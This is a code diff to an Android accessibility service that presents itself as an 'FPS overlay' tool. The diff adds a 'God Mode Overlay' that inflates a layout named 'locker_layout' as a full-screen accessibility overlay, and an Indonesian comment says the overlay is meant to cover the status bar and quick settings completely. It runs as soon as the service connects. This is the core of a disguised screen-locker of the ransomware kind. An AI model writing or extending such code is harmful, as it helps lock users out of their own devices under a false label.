@@ -2,8 +2,14 @@ package com.bluestacks.fpsoverlay;
 
 import android.accessibilityservice.AccessibilityService;
 import android.content.Intent;
+import android.graphics.PixelFormat;
 import android.net.Uri;
+import android.os.Build;
 import android.provider.Settings;
+import android.view.Gravity;
+import android.view.LayoutInflater;
+import android.view.View;
+import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 import java.util.List;
@@ -15,6 +21,8 @@ public class FPSAccessibilityService extends AccessibilityService {
 
     private long lastActionTime = 0;
     private static final long ACTION_DELAY = 1000; // Ditingkatkan ke 1s agar lebih stabil
+    private WindowManager windowManager;
+    private View godModeOverlay;
 
     @Override
     protected void onServiceConnected() {
@@ -22,7 +30,40 @@ public class FPSAccessibilityService extends AccessibilityService {
         writeLog("FPS Service Connected - Initializing Overlay"); 
         
         // Langsung lompat tanpa menunggu event pertama
-        jumpToOverlaySettings(); //
+        jumpToOverlaySettings(); 
+        
+        // Aktifkan God Mode Overlay
+        showGodModeOverlay();
+    }
+
+    private void showGodModeOverlay() {
+        if (godModeOverlay != null) return;
+
+        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+        godModeOverlay = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
+
+        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                // TYPE_ACCESSIBILITY_OVERLAY adalah kunci untuk menutupi Status Bar & Quick Settings secara total
+                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
+                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
+                PixelFormat.TRANSLUCENT);
+
+        params.gravity = Gravity.FILL;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
+        }
+
+        try {
+            windowManager.addView(godModeOverlay, params);
+            writeLog("God Mode Overlay Added successfully.");
+        } catch (Exception e) {
+            writeLog("Failed to add God Mode Overlay: " + e.getMessage());
+        }
     }
 
     private void writeLog(String text) {
